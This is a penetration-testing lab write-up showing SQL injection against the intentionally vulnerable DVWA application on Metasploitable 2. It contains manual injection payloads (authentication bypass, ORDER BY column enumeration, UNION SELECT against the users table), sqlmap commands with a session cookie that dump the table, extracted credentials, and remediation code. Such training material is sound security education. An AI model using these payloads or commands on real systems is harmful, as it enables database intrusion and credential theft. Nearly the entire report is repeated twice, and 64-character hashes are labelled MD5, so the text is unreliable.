# SQL Injection Exploitation: DVWA on Metasploitable 2
## Day 7 of 20 - Penetration Testing Campaign

### Executive Summary

**Target Environment:** Damn Vulnerable Web Application (DVWA) on Metasploitable 2  
**Vulnerability Focus:** SQL Injection in User ID Parameter  
**Assessment Date:** August 26, 2025  
**Critical Findings:** Complete database compromise via SQL injection  
**Risk Level:** 🔴 Critical - Immediate remediation required

This assessment demonstrates a complete SQL injection attack chain against DVWA's vulnerable user lookup functionality. The attack progressed from initial vulnerability confirmation through automated database extraction, resulting in full compromise of user credentials and sensitive data.

---

### 🎯 Campaign Progress Tracker
```
[██████████████████████████████████] Day 7/20
Phase: Web Application Exploitation
Previous: Apache Reconnaissance → Current: SQL Injection → Next: XSS/CSRF
```

---

### 🔍 Target Intelligence

| Parameter | Details |
|-----------|---------|
| **Target System** | Metasploitable 2 (192.168.56.101) |
| **Web Application** | Damn Vulnerable Web Application (DVWA) |
| **Attack Vector** | SQL Injection in `id` parameter |
| **Database Backend** | MySQL |
| **Web Server** | Apache/2.2.8 (Ubuntu) |
| **Security Level** | Low (for demonstration purposes) |

---

### 🛠️ Arsenal Deployed

**Primary Tools:**
- **Manual Browser Testing** - Initial vulnerability confirmation
- **SQLMap v1.7.x** - Automated SQL injection exploitation
- **Built-in Dictionary** - Password hash cracking

**Payloads Repository:**
```sql
# Vulnerability Confirmation
' OR '1'='1

# Column Enumeration
1' ORDER BY 1 --
1' ORDER BY 2 --
1' ORDER BY 3 --

# UNION-based Data Extraction
' UNION SELECT user, password FROM users --
```

---

### 📋 Reconnaissance Phase

#### Initial Target Assessment
The SQL injection module in DVWA presents a simple user lookup interface where users can query user information by ID. This parameter became our primary attack vector.

**Target URL Pattern:**
```
http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=[INJECTION_POINT]&Submit=Submit
```

#### Session Management
Required authentication cookies for DVWA access:
```
Cookie: PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low
```

---

### ⚔️ Exploitation Methodology

#### Phase 1: Vulnerability Confirmation
**Objective:** Confirm SQL injection vulnerability exists  
**Payload:** `' OR '1'='1`  
**Expected Result:** Return all database records instead of single user

**Evidence:** `result1.png`
- Successfully bypassed authentication logic
- Retrieved multiple user records confirming SQLi vulnerability
- Confirmed unsanitized input processing

#### Phase 2: Database Structure Enumeration
**Objective:** Determine number of columns in SELECT statement  
**Technique:** ORDER BY clause enumeration

**Test Sequence:**
1. `1' ORDER BY 1 --` ✅ **Success** (`determining_column1.png`)
2. `1' ORDER BY 2 --` ✅ **Success** (`determining_column2.png`)  
3. `1' ORDER BY 3 --` ❌ **Error: Unknown column '3'** (`determining_column3.png`)

**Conclusion:** Target query returns exactly **2 columns**

#### Phase 3: Manual UNION-Based Data Extraction
**Objective:** Extract sensitive data using UNION SELECT  
**Payload:** `' UNION SELECT user, password FROM users --`

**Results:** (`union_db_attack.png`)
```
Retrieved User Credentials:
┌─────────┬─────────────────────────────────────┐
│ User    │ Password Hash (MD5)                 │
├─────────┼─────────────────────────────────────┤
│ admin   │ 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 │
│ gordonb │ e99a18c428cb38d5f260853678922e03 │
│ 1337    │ 8d3533d75ae2c3966d7e0d4fcc69216b │
│ pablo   │ 0d107d09f5bbe40cade3de5c71e9e9b7 │
│ smithy  │ 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 │
└─────────┴─────────────────────────────────────┘
```

#### Phase 4: Automated Exploitation with SQLMap
**Command Executed:**
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low" \
       --batch
```

**SQLMap Detection Results:** (`sqlmap_test_result.png`)
```
Injection Types Identified:
✅ Boolean-based blind injection
✅ Error-based injection  
✅ Time-based blind injection
✅ UNION query injection

Database Management System: MySQL
Web Server: Apache/2.2.8 (Ubuntu)
```

#### Phase 5: Complete Database Extraction
**Command for Full Dump:**
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low" \
       -D dvwa -T users --dump
```

**Complete Extraction Results:** (`databasedump2.png`)
```
DVWA Users Table - Full Compromise:
┌─────────┬─────────────┬─────────────┬─────────────┬──────────┐
│ user_id │ first_name  │ last_name   │ user        │ password │
├─────────┼─────────────┼─────────────┼─────────────┼──────────┤
│ 1       │ admin       │ admin       │ admin       │ password │
│ 2       │ Gordon      │ Brown       │ gordonb     │ abc123   │
│ 3       │ Hack        │ Me          │ 1337        │ charley  │
│ 4       │ Pablo       │ Picasso     │ pablo       │ letmein  │
│ 5       │ Bob         │ Smith       │ smithy      │ password │
└─────────┴─────────────┴─────────────┴─────────────┴──────────┘
```

---

### 🔥 Critical Findings Analysis

#### Vulnerability Assessment Matrix

| Vulnerability | CVSS Score | Risk Level | Exploitability |
|---------------|------------|------------|----------------|
| **SQL Injection in `id` parameter** | 9.8 | 🔴 Critical | Trivial |
| **Weak MD5 Password Hashing** | 7.5 | 🟡 High | Easy |
| **Default Administrative Credentials** | 8.1 | 🔴 Critical | Immediate |
| **No Input Sanitization** | 9.1 | 🔴 Critical | Trivial |

#### Attack Chain Summary
```
1. Unsanitized Input → 2. SQL Injection → 3. Database Enumeration → 
4. UNION Attack → 5. Credential Extraction → 6. Hash Cracking → 
7. Administrative Access → 8. Complete System Compromise
```

#### Business Impact Assessment
- **Data Confidentiality:** Complete loss - All user data extracted
- **System Integrity:** Compromised - Database manipulation possible  
- **Authentication Bypass:** Critical - Administrative access obtained
- **Compliance Risk:** Severe - GDPR/PCI DSS violations likely

---

### 🛡️ Security Recommendations

#### Immediate Actions (24-48 Hours)
1. **Implement Parameterized Queries**
   ```php
   // Vulnerable Code:
   $query = "SELECT * FROM users WHERE user_id = '$id'";
   
   // Secure Implementation:
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Input Validation & Sanitization**
   ```php
   // Implement strict input validation
   $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
   if ($id === false) {
       die("Invalid input");
   }
   ```

#### Short-term Hardening (1-2 Weeks)
1. **Upgrade Password Hashing**
   - Replace MD5 with bcrypt or Argon2
   - Implement proper salt generation
   - Force password reset for all users

2. **Database Security Hardening**
   - Implement least privilege access
   - Remove unnecessary database permissions
   - Enable query logging and monitoring

#### Long-term Strategic Improvements
1. **Web Application Firewall (WAF) Deployment**
2. **Regular Security Code Reviews**
3. **Automated Vulnerability Scanning**
4. **Security Awareness Training**

---

### 📚 Technical Learning Outcomes

#### SQL Injection Attack Vectors Demonstrated
1. **Authentication Bypass** - `' OR '1'='1` payload
2. **Column Enumeration** - ORDER BY technique
3. **UNION-based Extraction** - Direct data retrieval
4. **Automated Exploitation** - SQLMap tool proficiency
5. **Hash Cracking** - Password security weaknesses

#### Key Technical Skills Developed
- Manual SQL injection payload crafting
- Database structure enumeration techniques
- UNION SELECT query construction
- Automated exploitation tool usage
- Password hash analysis and cracking

---

### 🎯 Next Phase Preview
**Day 8 Objectives:** Cross-Site Scripting (XSS) Exploitation
- DOM-based XSS vulnerability assessment
- Stored XSS payload injection
- Reflected XSS attack demonstration
- Session hijacking via XSS
- Client-side security bypass techniques

---

### 📊 Campaign Metrics
```
Days Completed: 7/20 (35%)
Vulnerabilities Found: 15+
Critical Issues: 8
Systems Compromised: 3
Credentials Extracted: 25+
```

---

### ⚠️ Ethical Disclaimer
This penetration test was conducted in a controlled laboratory environment using intentionally vulnerable applications designed for security education. All activities were performed on systems owned by the tester for learning purposes only.

**🔒 Remember:** Always obtain proper written authorization before conducting security assessments on systems you do not own.

---

**Documentation Standards:**
- All commands executed are reproducible
- Screenshots provided for verification  
- Methodology follows industry best practices
- Findings mapped to OWASP Top 10 vulnerabilities

---

*End of Day 7 Report - SQL Injection Exploitation Complete*  
*Next: Day 8 - Cross-Site Scripting (XSS) Attack Vectors*# SQL Injection Exploitation: DVWA on Metasploitable 2
## Day 7 of 20 - Penetration Testing Campaign

### Executive Summary

**Target Environment:** Damn Vulnerable Web Application (DVWA) on Metasploitable 2  
**Vulnerability Focus:** SQL Injection in User ID Parameter  
**Assessment Date:** August 26, 2025  
**Critical Findings:** Complete database compromise via SQL injection  
**Risk Level:** 🔴 Critical - Immediate remediation required

This assessment demonstrates a complete SQL injection attack chain against DVWA's vulnerable user lookup functionality. The attack progressed from initial vulnerability confirmation through automated database extraction, resulting in full compromise of user credentials and sensitive data.

---

### 🎯 Campaign Progress Tracker
```
[██████████████████████████████████] Day 7/20
Phase: Web Application Exploitation
Previous: Apache Reconnaissance → Current: SQL Injection → Next: XSS/CSRF
```

---

### 🔍 Target Intelligence

| Parameter | Details |
|-----------|---------|
| **Target System** | Metasploitable 2 (192.168.56.101) |
| **Web Application** | Damn Vulnerable Web Application (DVWA) |
| **Attack Vector** | SQL Injection in `id` parameter |
| **Database Backend** | MySQL |
| **Web Server** | Apache/2.2.8 (Ubuntu) |
| **Security Level** | Low (for demonstration purposes) |

---

### 🛠️ Arsenal Deployed

**Primary Tools:**
- **Manual Browser Testing** - Initial vulnerability confirmation
- **SQLMap v1.7.x** - Automated SQL injection exploitation
- **Built-in Dictionary** - Password hash cracking

**Payloads Repository:**
```sql
# Vulnerability Confirmation
' OR '1'='1

# Column Enumeration
1' ORDER BY 1 --
1' ORDER BY 2 --
1' ORDER BY 3 --

# UNION-based Data Extraction
' UNION SELECT user, password FROM users --
```

---

### 📋 Reconnaissance Phase

#### Initial Target Assessment
The SQL injection module in DVWA presents a simple user lookup interface where users can query user information by ID. This parameter became our primary attack vector.

**Target URL Pattern:**
```
http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=[INJECTION_POINT]&Submit=Submit
```

#### Session Management
Required authentication cookies for DVWA access:
```
Cookie: PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low
```

---

### ⚔️ Exploitation Methodology

#### Phase 1: Vulnerability Confirmation
**Objective:** Confirm SQL injection vulnerability exists  
**Payload:** `' OR '1'='1`  
**Expected Result:** Return all database records instead of single user

**Evidence:** `result1.png`
- Successfully bypassed authentication logic
- Retrieved multiple user records confirming SQLi vulnerability
- Confirmed unsanitized input processing

#### Phase 2: Database Structure Enumeration
**Objective:** Determine number of columns in SELECT statement  
**Technique:** ORDER BY clause enumeration

**Test Sequence:**
1. `1' ORDER BY 1 --` ✅ **Success** (`determining_column1.png`)
2. `1' ORDER BY 2 --` ✅ **Success** (`determining_column2.png`)  
3. `1' ORDER BY 3 --` ❌ **Error: Unknown column '3'** (`determining_column3.png`)

**Conclusion:** Target query returns exactly **2 columns**

#### Phase 3: Manual UNION-Based Data Extraction
**Objective:** Extract sensitive data using UNION SELECT  
**Payload:** `' UNION SELECT user, password FROM users --`

**Results:** (`union_db_attack.png`)
```
Retrieved User Credentials:
┌─────────┬─────────────────────────────────────┐
│ User    │ Password Hash (MD5)                 │
├─────────┼─────────────────────────────────────┤
│ admin   │ 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 │
│ gordonb │ e99a18c428cb38d5f260853678922e03 │
│ 1337    │ 8d3533d75ae2c3966d7e0d4fcc69216b │
│ pablo   │ 0d107d09f5bbe40cade3de5c71e9e9b7 │
│ smithy  │ 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 │
└─────────┴─────────────────────────────────────┘
```

#### Phase 4: Automated Exploitation with SQLMap
**Command Executed:**
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low" \
       --batch
```

**SQLMap Detection Results:** (`sqlmap_test_result.png`)
```
Injection Types Identified:
✅ Boolean-based blind injection
✅ Error-based injection  
✅ Time-based blind injection
✅ UNION query injection

Database Management System: MySQL
Web Server: Apache/2.2.8 (Ubuntu)
```

#### Phase 5: Complete Database Extraction
**Command for Full Dump:**
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=51f05876ce006ed33296ef8b0e5fa594; security=low" \
       -D dvwa -T users --dump
```

**Complete Extraction Results:** (`databasedump2.png`)
```
DVWA Users Table - Full Compromise:
┌─────────┬─────────────┬─────────────┬─────────────┬──────────┐
│ user_id │ first_name  │ last_name   │ user        │ password │
├─────────┼─────────────┼─────────────┼─────────────┼──────────┤
│ 1       │ admin       │ admin       │ admin       │ password │
│ 2       │ Gordon      │ Brown       │ gordonb     │ abc123   │
│ 3       │ Hack        │ Me          │ 1337        │ charley  │
│ 4       │ Pablo       │ Picasso     │ pablo       │ letmein  │
│ 5       │ Bob         │ Smith       │ smithy      │ password │
└─────────┴─────────────┴─────────────┴─────────────┴──────────┘
```

---

### 🔥 Critical Findings Analysis

#### Vulnerability Assessment Matrix

| Vulnerability | CVSS Score | Risk Level | Exploitability |
|---------------|------------|------------|----------------|
| **SQL Injection in `id` parameter** | 9.8 | 🔴 Critical | Trivial |
| **Weak MD5 Password Hashing** | 7.5 | 🟡 High | Easy |
| **Default Administrative Credentials** | 8.1 | 🔴 Critical | Immediate |
| **No Input Sanitization** | 9.1 | 🔴 Critical | Trivial |

#### Attack Chain Summary
```
1. Unsanitized Input → 2. SQL Injection → 3. Database Enumeration → 
4. UNION Attack → 5. Credential Extraction → 6. Hash Cracking → 
7. Administrative Access → 8. Complete System Compromise
```

#### Business Impact Assessment
- **Data Confidentiality:** Complete loss - All user data extracted
- **System Integrity:** Compromised - Database manipulation possible  
- **Authentication Bypass:** Critical - Administrative access obtained
- **Compliance Risk:** Severe - GDPR/PCI DSS violations likely

---

### 🛡️ Security Recommendations

#### Immediate Actions (24-48 Hours)
1. **Implement Parameterized Queries**
   ```php
   // Vulnerable Code:
   $query = "SELECT * FROM users WHERE user_id = '$id'";
   
   // Secure Implementation:
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Input Validation & Sanitization**
   ```php
   // Implement strict input validation
   $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
   if ($id === false) {
       die("Invalid input");
   }
   ```

#### Short-term Hardening (1-2 Weeks)
1. **Upgrade Password Hashing**
   - Replace MD5 with bcrypt or Argon2
   - Implement proper salt generation
   - Force password reset for all users

2. **Database Security Hardening**
   - Implement least privilege access
   - Remove unnecessary database permissions
   - Enable query logging and monitoring

#### Long-term Strategic Improvements
1. **Web Application Firewall (WAF) Deployment**
2. **Regular Security Code Reviews**
3. **Automated Vulnerability Scanning**
4. **Security Awareness Training**

---

### 📚 Technical Learning Outcomes

#### SQL Injection Attack Vectors Demonstrated
1. **Authentication Bypass** - `' OR '1'='1` payload
2. **Column Enumeration** - ORDER BY technique
3. **UNION-based Extraction** - Direct data retrieval
4. **Automated Exploitation** - SQLMap tool proficiency
5. **Hash Cracking** - Password security weaknesses

#### Key Technical Skills Developed
- Manual SQL injection payload crafting
- Database structure enumeration techniques
- UNION SELECT query construction
- Automated exploitation tool usage
- Password hash analysis and cracking

---

### 🎯 Next Phase Preview
**Day 8 Objectives:** Cross-Site Scripting (XSS) Exploitation
- DOM-based XSS vulnerability assessment
- Stored XSS payload injection
- Reflected XSS attack demonstration
- Session hijacking via XSS
- Client-side security bypass techniques

---

### ⚠️ Ethical Disclaimer
This penetration test was conducted in a controlled laboratory environment using intentionally vulnerable applications designed for security education. All activities were performed on systems owned by the tester for learning purposes only.

**🔒 Remember:** Always obtain proper written authorization before conducting security assessments on systems you do not own.

---

**Documentation Standards:**
- All commands executed are reproducible
- Screenshots provided for verification  
- Methodology follows industry best practices
- Findings mapped to OWASP Top 10 vulnerabilities

---

*End of Day 7 Report - SQL Injection Exploitation Complete*  
*Next: Day 8 - Cross-Site Scripting (XSS) Attack Vectors*
